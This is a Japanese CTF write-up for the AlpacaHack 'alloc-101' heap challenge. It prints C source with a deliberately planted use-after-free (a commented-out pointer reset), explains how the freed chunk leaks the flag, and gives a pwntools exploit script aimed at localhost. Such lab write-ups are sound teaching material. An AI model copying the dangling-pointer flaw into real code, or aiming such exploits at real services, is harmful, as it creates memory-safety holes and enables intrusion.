[alloc-101 - AlpacaHack](https://alpacahack.com/challenges/alloc-101)

## 1. Writeup
`chall.c#L16-L62`:
```C:chall.c
16	int main(void) {
17	    FILE *f_ptr = fopen("/flag.txt","r");
18	    if (f_ptr == NULL) {
19	        puts("open flag.txt failed. please open a ticket"); 
20	        exit(1);
21	    }
22	    fseek(f_ptr,0,SEEK_END);
23	    long f_sz = ftell(f_ptr);
24	    printf("file information: %ld bytes\n",f_sz);
25	    fseek(f_ptr,0,SEEK_SET);
26	    menu();
27	    while(1) {
28	        int choice;
29	        printf("choice> ");
30	        scanf("%d%*c",&choice);
31	        switch(choice) {
32	            case 1: {
33	                printf("size> ");
34	                int size;
35	                scanf("%d%*c",&size);
36	                item = malloc(size);
37	                printf("[DEBUG] item: %p\n",item);
38	            }
39	            break;
40	            case 2: {
41	                assert(item != NULL);
42	                free(item);
43	                //item == NULL;
44	            }
45	            break;
46	            case 3: {
47	                assert(item != NULL);
48	                puts(item);
49	            }
50	            break;
51	            case 4: {
52	                char *flag = malloc(f_sz);
53	                printf("[DEBUG] flag: %p\n",flag);
54	                fgets(flag,f_sz,f_ptr);
55	            }
56	            break;
57	            default: {
58	                exit(0);
59	            }
60	        }
61	    }
62	}
```

注目すべき部分は以下.

`chall.c:#L40-L44`:
```C:chall.c
40	            case 2: {
41	                assert(item != NULL);
42	                free(item);
43	                //item == NULL;
44	            }
```

`free(item)` 後に, グローバルポインタ `item` の初期化がされていない. 初期化処理 `item == NULL;` がコメントアウトされていることがヒント.

このことから, UAF(Use After Free)によってFlagをリークできる.

`allocate` → `free` → `allocate_flag` → `read` の順でFlagを取得する. `allocate` で指定するサイズは `chall.c#L24`:`printf("file information: %ld bytes\n",f_sz);` で出力されるバイト数以上を指定すれば十分.

`solve.py`:
```python:solve.py
 1	from pwn import *
 2	
 3	context(os='linux', arch='amd64')
 4	
 5	HOST = "localhost"
 6	PORT = 9999
 7	
 8	io = remote(HOST, PORT)
 9	
10	def exploit():
11		def choice(number):
12			io.sendlineafter(b"choice>", str(number).encode())
13	
14		def allocate(size):
15			choice(1)
16			io.sendlineafter(b"size>", str(size).encode())
17	
18		def free():
19			choice(2)
20	
21		def read():
22			choice(3)
23	
24		def allocate_flag():
25			choice(4)
26	
27		allocate(27)
28		free()
29		allocate_flag()
30		read()
31		io.interactive()
32	
33	if __name__ == "__main__":
34		exploit()
```